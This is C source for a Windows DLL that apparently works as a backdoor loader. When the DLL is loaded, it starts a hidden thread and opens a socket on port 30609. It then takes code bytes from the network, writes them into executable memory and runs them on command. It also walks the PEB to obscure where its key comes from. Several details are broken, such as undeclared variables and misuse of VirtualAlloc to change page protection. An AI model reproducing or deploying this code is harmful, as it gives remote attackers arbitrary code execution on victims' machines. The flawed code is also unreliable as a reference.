#include "socket.h"
#include <windows.h>
#include <intrin.h>

struct tcp_entry_address {
	struct tcp_entry ehdr;
	uint64_t address;
};

const char *g_decryption_key;
const char *get_decryption_key(void)
{
	uint64_t base = *(uint64_t*)(__readgsqword(0x60) + 0x18);
	uint64_t a0;

	base = *(uint64_t*)(base + 0x20);
	base = *(uint64_t*)(base);
	base = *(uint64_t*)(base + 0x20);

	a0 = base + *(uint16_t*)(base + 0x3C);
	a0 = base + *(uint32_t*)(a0 + 0x88);
	a0 = *(int*)(base + *(int*)(a0 + 0x20) + (4 * 4));

	return (const char*)(base + a0);
}

static char heap[8192];
static void *function_list[32];
static void *function_data;
static int  function_count, function_size;

static void function_add(struct tcp_header *hdr, struct tcp_entry *ehdr)
{
	int len = ehdr->next - 4;
	struct tcp_entry_address *entry = (struct tcp_entry_address*)ehdr;

	if (len == -4)
		return;

	VirtualAlloc(function_data, 8192, MEM_COMMIT, PAGE_READWRITE);
	memcpy(
		(void*)((char *)function_data + function_size),
		(void*)((char *)ehdr + sizeof(struct tcp_entry)),
		len);
	function_list[function_count++] = (void*)((char *)function_data + function_size);
	function_size += len;
	VirtualAlloc(function_data, 8192, MEM_COMMIT, PAGE_EXECUTE_READ);
}

static void function_clear(struct tcp_header *hdr, struct tcp_entry *ehdr)
{
	VirtualAlloc(function_data, 8192, MEM_COMMIT, PAGE_READWRITE);
	memset(function_data, 0, function_size);
	function_count = 4;
	function_size  = 0; 
	VirtualAlloc(function_data, 8192, MEM_COMMIT, PAGE_EXECUTE_READ);
}

static void function_heap(struct tcp_header *hdr, struct tcp_entry *ehdr)
{
	*(uint64_t*)((char *)hdr + hdr->size) = (uint64_t)&heap;
	hdr->size += sizeof(uint64_t);
}

static void function_address(struct tcp_header *hdr, struct tcp_entry *ehdr)
{
	struct tcp_entry_address *entry = (struct tcp_entry_address*)ehdr;
	*(uint64_t*)((char *)hdr + hdr->size) = (uint64_t)function_list[entry->address];
	hdr->size += sizeof(uint64_t);
}

static void packet_routine(char *data)
{
	struct tcp_header *hdr = (struct tcp_header *)data;
	struct tcp_entry *ehdr = (struct tcp_entry *)(data + sizeof(struct tcp_header));
	while (1) {
		uint16_t next = ehdr->next;

		((void (*)(struct tcp_header *, struct tcp_entry *))function_list[ehdr->id])(hdr, ehdr);
		if (next == 0)
			break;

		ehdr = (struct tcp_entry *)((char *)ehdr + next);
	}
	if (hdr->retn)
		socket_send(data, hdr->size);
}

#ifdef _DEBUG
int main(void)
{
	g_decryption_key = get_decryption_key();
	function_data = VirtualAlloc(0, 8192, MEM_COMMIT, PAGE_EXECUTE_READ);
	if (function_data == 0)
		return 0;
	memset(function_list, 0, sizeof(function_list));
	function_list[function_count++] = function_address;
	function_list[function_count++] = function_add;
	function_list[function_count++] = function_clear;
	function_list[function_count++] = function_heap;
	socket_open(0, 30609);
	char* buffer = malloc(1024 * 500);
	while (1) {
		key = 0;
		memcpy(decryption_key, g_decryption_key, 30);
		socket_open_client();
		while (1) {
			int bytes = socket_recv(buffer, 1024 * 500);

			if (bytes < 8)
				break;

			if (key == 0) {
				if (bytes != 30)
					break;
				memcpy(decryption_key, buffer, 30);
				socket_send(buffer, 30);
				key = 1;
				continue;
			}
			packet_routine(buffer);
		}
		socket_close_client();
	}
	free(buffer);
	VirtualFree(function_data, 8192, MEM_FREE);
}
#else

static int key;
DWORD WINAPI MainThread(LPVOID lpThreadParameter)
{
	g_decryption_key = get_decryption_key();
	function_data = VirtualAlloc(0, 8192, MEM_COMMIT, PAGE_EXECUTE_READ);
	if (function_data == 0)
		return 0;
	memset(function_list, 0, sizeof(function_list));
	function_list[function_count++] = function_address;
	function_list[function_count++] = function_add;
	function_list[function_count++] = function_clear;
	function_list[function_count++] = function_heap;
	char* buffer = malloc(1024 * 500);
	while (1) {
		key = 0;
		memcpy(decryption_key, g_decryption_key, 30);
		socket_open_client();
		while (1) {
			int bytes = socket_recv(buffer, 1024 * 500);

			if (bytes < 8)
				break;

			if (key == 0) {
				if (bytes != 30)
					break;
				memcpy(decryption_key, buffer, 30);
				socket_send(buffer, 30);
				key = 1;
				continue;
			}
			packet_routine(buffer);
		}
		socket_close_client();
	}
	free(buffer);
	VirtualFree(function_data, 8192, MEM_FREE);
}

BOOL WINAPI DllMain(HMODULE hModule, DWORD rea, LPVOID res)
{
	BOOL status = 0;
	switch (rea) {
	case DLL_PROCESS_ATTACH:
		socket_open(0, 30609);
		status = 1;
		CloseHandle(CreateThread(0, 0, MainThread, 0, 0, 0));
		break;
	case DLL_PROCESS_DETACH:
		socket_close();
		break;
	}
	return status;
}

#endif
